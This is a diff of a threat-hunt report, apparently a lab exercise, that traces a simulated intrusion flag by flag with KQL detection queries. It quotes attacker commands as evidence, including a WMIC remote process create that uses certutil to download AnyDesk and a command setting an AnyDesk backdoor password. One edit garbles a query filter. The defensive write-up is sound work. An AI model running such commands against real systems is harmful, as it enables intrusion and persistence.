@@ -17,10 +17,12 @@ Analyst Assigned: `Fasi Sika` <br>
 Report Date: 25 FEB 2026
 
 A compromised user account is being used to conduct interactive attack activity. This behavior is indicative of an attacker who has gained access to valid credentials and is manually executing commands on the system.
+
 ## Threat Hunt
 
 ### Section 1: Initial Access
-The attacker needed a way in. Something landed on an endpoint - whether it was clicked, downloaded, or delivered - and kicked off the entire compromise. Trace the infection back to its origin. Identify what arrived, how it executed, and what it spawned.
+> The attacker needed a way in. Something landed on an endpoint - whether it was clicked, downloaded, or delivered - and kicked off the entire compromise. Trace the infection back to its origin. Identify what arrived, how it executed, and what it spawned.
+
 #### 🚩Flag 1: Initial Vector
 **Question**: Identify the file that started the infection chain <br>
 The file `daniel_richardson_cv.pdf.exe` uses a double file extension, a common social engineering technique used by attackers to disguise malicious files as legitimate documents. Windows hides known file extensions by default, causing this file to appear as `daniel_richardson_cv.pdf` to the victim. This deception makes the file appear to be a resume or PDF document, increasing the likelihood the victim will open the file. As a recruiting company, it is very common for them to work with PDFs. Once executed, the file initiates the infection chain. 
@@ -30,7 +32,8 @@ The file `daniel_richardson_cv.pdf.exe` uses a double file extension, a common s
 DeviceProcessEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName == "as-pc1"
-| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
+| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
+	SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
 | order by Timestamp asc
 ```
 
@@ -41,6 +44,7 @@ DeviceProcessEvents
 **Timestamp**: `2026-01-15T03:58:55.6563735Z`
 
 </details>
+
 #### 🚩Flag 2: Payload Hash
 **Question**: Identify the SHA256 hash of the initial payload
 
@@ -51,7 +55,8 @@ The SHA256 hash of `daniel_richardson_cv.pdf.exe` was confirmed to be `48b97fd91
 DeviceProcessEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName == "as-pc1"
-| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
+| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
+	SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
 | order by Timestamp asc
 ```
 
@@ -74,7 +79,8 @@ DeviceProcessEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName == "as-pc1"
 | where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
-| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
+| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
+	 SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
 | order by Timestamp asc
 ```
 
@@ -85,6 +91,7 @@ DeviceProcessEvents
 **Timestamp**: `2026-01-15T03:58:55.6563735Z`
 
 </details>
+
 #### 🚩Flag 4: Suspicious Child Process
 **Question**: What legitimate Windows process was spawned?
 
@@ -110,6 +117,7 @@ DeviceProcessEvents
 **Timestamp**: `2026-01-15T05:09:53.3995975Z`
 
 </details>
+
 #### 🚩Flag 5: Process Arguments
 **Question**: The spawned process executed with unusual arguments. What was the full command line?
 
@@ -147,6 +155,7 @@ DeviceProcessEvents
 
 ### Section 2: Command & Control
 > With a foothold established, the attacker needed to talk back to their infrastructure. Outbound connections were made to adversary-controlled domains. Identify how the attacker maintained communication and where their infrastructure lives.
+
 #### 🚩Flag 6: C2 Domain
 **Question**: What domain was used for command and control?
 
@@ -160,7 +169,8 @@ DeviceNetworkEvents
 | where ActionType has_any ("ConnectionSuccess", "ConnectionAttempt")
 | where isnotempty(RemoteUrl)
 | project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName,
-    InitiatingProcessFolderPath, InitiatingProcessSHA256, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
+    InitiatingProcessFolderPath, InitiatingProcessSHA256, InitiatingProcessCommandLine, RemoteIP,
+	RemotePort, RemoteUrl
 | sort by Timestamp asc
 ```
 
@@ -171,6 +181,7 @@ DeviceNetworkEvents
 **Timestamp**: `2026-01-15T04:04:33.2301079Z`
 
 </details>
+
 #### 🚩Flag 7: C2 Process
 **Question**: What process initiated the outbound connections?
 
@@ -227,6 +238,7 @@ DeviceNetworkEvents
 
 ### Section 3: Credential Access
 > Credentials are the keys to the kingdom. The attacker went after stored secrets on the compromised host - targeting local credential stores and using in-memory techniques to extract authentication material. Determine what was targeted, how it was stolen, and who was doing it.
+
 #### 🚩Flag 9: Registry Targets
 **Question**: The attacker targeted local credential stores. What two registry hives were targeted?
 
@@ -258,6 +270,7 @@ DeviceProcessEvents
 **Timestamp**: `2026-01-15T04:13:32.7652183Z`
 
 </details>
+
 #### 🚩Flag 10: Local Staging
 **Question**: Extracted data was saved locally before exfiltration. Where were the credentials saved?
 
@@ -308,6 +321,7 @@ DeviceProcessEvents
 
 ### Section 4: Discovery 
 > Before moving deeper, the attacker needed to understand the environment. They ran commands to figure out who they were, what was around them, and what they could reach. Identify the reconnaissance activity and what intelligence the attacker gathered.
+
 #### 🚩Flag 12: User Context
 **Question**: The attacker confirmed their identity  after initial access. What command was used?
 
@@ -330,6 +344,7 @@ DeviceProcessEvents
 **Timestamp**: `2026-01-15T03:58:55.6563735Z`
 
 </details>
+
 #### 🚩Flag 13: Network Enumeration
 **Question**: What command was used to view available shares?
 
@@ -352,6 +367,7 @@ DeviceProcessEvents
 **Timestamp**: `2026-01-15T04:01:32.0791816Z`
 
 </details>
+
 #### 🚩Flag 14: Local Admins
 **Question**: The attacker enumerated privileged local group memebership. What group was queried?
 
@@ -378,6 +394,7 @@ DeviceProcessEvents
 
 ### Section 5: Persistence - Remote Tool
 > The attacker wasn't planning a short visit. Multiple mechanisms were deployed to ensure continued access - legitimate tools repurposed, tasks scheduled, accounts created. Map out every backdoor they left behind.
+
 #### 🚩Flag 15: Remote Tool
 **Question**: A legitimate remote administator tool was deployed for ongoing access. What software was installed?
 
@@ -390,7 +407,8 @@ DeviceFileEvents
 | where DeviceName =~ "as-pc1"
 | where InitiatingProcessAccountName == "sophie.turner"
 | project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath,
-    InitiatingProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessSHA256
+    InitiatingProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessFolderPath,
+	InitiatingProcessSHA256
 | sort by Timestamp asc
 ```
 
@@ -487,7 +505,7 @@ DeviceProcessEvents
 **Question**: Unattended access was configured for the remote tool. What password was set?
 
 The attacker configured unattended access for AnyDesk by setting the password `intrud3r!` using the following command: 
-```PowerShell
+```cmd
 cmd.exe /c "echo intrud3r! | C:\Users\Public\AnyDesk.exe --set-password"
 ```
 
@@ -543,12 +561,14 @@ DeviceFileEvents
 
 ### Section 6: Lateral Movement
 > One host wasn't enough. The attacker moved through the environment, and not every method worked the first time. Track the path they took, the tools they tried, the accounts they used, and the order they moved.
+
 #### 🚩Flag 21: Failed Execution
 **Question**: The attacker attempted remote execution methods that failed. What two tools were tried?
 
 The attacker attempted to move laterally to host `AS-PC2` using two common Windows remote execution tools: 
 - `WMIC.exe`
 - `PsExec.exe`
+  
 Both tools allow the execution of commands remotely to other machines in the network. The first attempt uses `WMIC.exe` to create a process on `AS-PC2`, downloading `AnyDesk.exe`:
 ```cmd
 "WMIC.exe" /node:AS-PC2 /user:Administrator /password:******** process call create "cmd.exe /c certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe"
@@ -564,7 +584,7 @@ Then the attacker attempted a second time using `PsExec`, a [Sysinternals]() too
 DeviceProcessEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName has "as-"
-| where InitiatingProcessFileName has_any ("powershell", "cmd")
+| where InitiatingProcessFileName has_any ("`", "cmd")
 | project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
     SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName
 | sort by Timestamp asc
@@ -601,6 +621,7 @@ DeviceProcessEvents
 **Timestamp**: `2026-01-15T04:18:44.6123349Z`
 
 </details>
+
 #### 🚩Flag 23: Successful Pivot
 **Question**: After failed attempts,  a different method achieved lateral movement. What windows executable was used?
 
@@ -726,8 +747,10 @@ DeviceProcessEvents
 **Finding**: `david.mitchell`
 
 </details>
+
 ### Section 7: Persistence - Scheduled Task
 > The attacker planted additional persistence beyond the remote tool. Scheduled tasks and new accounts extend their access even if one mechanism is discovered and removed.
+
 #### 🚩Flag 28 Scheduled Persistence 
 **Question**: A scheduled task was created for persistence. What is the task name?
 
@@ -814,6 +837,7 @@ DeviceProcessEvents
 **Finding**: `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`
 
 </details>
+
 #### 🚩Flag 31: Backdoor Account
 **Question**: A new backdoor account was created for future access. What is the username?
 
@@ -831,7 +855,8 @@ DeviceProcessEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
 | where ProcessCommandLine has "/add"
-| project Timestamp, ActionType, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessFileName
+| project Timestamp, ActionType, DeviceName, AccountName, FileName, ProcessCommandLine,
+	InitiatingProcessCommandLine, InitiatingProcessFileName
 | sort by Timestamp asc
 ```
 
@@ -845,6 +870,7 @@ DeviceProcessEvents
 
 ### Section 8: Data Access
 > The attacker found what they came for. Sensitive data was located, accessed, and staged for extraction. Identify what was taken, where it was accessed from, and how it was packaged.
+
 #### 🚩Flag 32: Sensitive Document
 **Question**: A sensistive document was accessed on the file server. What is the filename?
 
@@ -856,7 +882,8 @@ DeviceFileEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName has "as-srv"
 | where FolderPath has @"C:\Shares"
-| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
+| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath,
+	InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
 | sort by Timestamp asc
 ```
 
@@ -866,6 +893,7 @@ DeviceFileEvents
 **Finding**: `BACS_Payments_Dec2025.ods
 
 </details>
+
 #### 🚩Flag 33: Modification Evidence
 **Question**: The document was opened for editing, not just viewing. What file artifact proves this? 
 
@@ -877,7 +905,8 @@ DeviceFileEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName has "as-srv"
 | where FolderPath has @"C:\Shares"
-| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
+| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath,
+	InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
 | sort by Timestamp asc
 ```
 
@@ -898,7 +927,8 @@ Logs show the document was accessed from the host `AS-PC2`
 DeviceFileEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where FileName =~ "BACS_Payments_Dec2025.ods"
-| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
+| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath,
+	InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
 | sort by Timestamp asc
 ```
 
@@ -932,7 +962,8 @@ DeviceFileEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName startswith "as-"
 | where FileName has_any (".7z", ".zip", ".tar", ".rar")
-| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
+| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath,
+	InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
 | sort by Timestamp asc
 ```
 
@@ -942,6 +973,7 @@ DeviceFileEvents
 **Finding**: `Shares.7z`
 
 </details>
+
 #### 🚩Flag 36: Archive Hash
 **Question**: What is the filehash?
 
@@ -951,7 +983,8 @@ DeviceFileEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName startswith "as-"
 | where FileName has_any (".7z", ".zip", ".tar", ".rar")
-| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
+| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath,
+	InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
 | sort by Timestamp asc
 ```
 
@@ -983,7 +1016,8 @@ DeviceProcessEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
 | where ProcessCommandLine contains "wevtutil"
-| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName
+| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
+	SHA256, InitiatingProcessFileName
 | sort by Timestamp asc
 ```
 
@@ -1018,7 +1052,8 @@ DeviceEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
 | where ActionType == "ClrUnbackedModuleLoaded"
-| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath
+| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine,
+	InitiatingProcessFileName, InitiatingProcessFolderPath
 | sort by Timestamp asc
 ```
 
@@ -1042,7 +1077,8 @@ DeviceEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
 | where ActionType == "ClrUnbackedModuleLoaded"
-| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, AdditionalFields
+| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine,
+	InitiatingProcessFileName, InitiatingProcessFolderPath, AdditionalFields
 | sort by Timestamp asc
 ```
 
@@ -1064,7 +1100,8 @@ DeviceEvents
 | where Timestamp > datetime(2026-01-15T00:00:00Z)
 | where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
 | where ActionType == "ClrUnbackedModuleLoaded"
-| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, AdditionalFields
+| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine,
+	InitiatingProcessFileName, InitiatingProcessFolderPath, AdditionalFields
 | sort by Timestamp asc
 ```
 
@@ -1074,6 +1111,7 @@ DeviceEvents
 **Finding**: `notepad.exe`
 
 </details>
+
 ## Root Cause Analysis
 
 The root cause of this incident was the execution of a malicious file disguised as a legitimate resume document, `daniel_richardson_cv.pdf.exe`, on workstation `AS-PC1`. The file used a double extension to appear as a normal PDF, increasing the likelihood that the user would trust and open it.
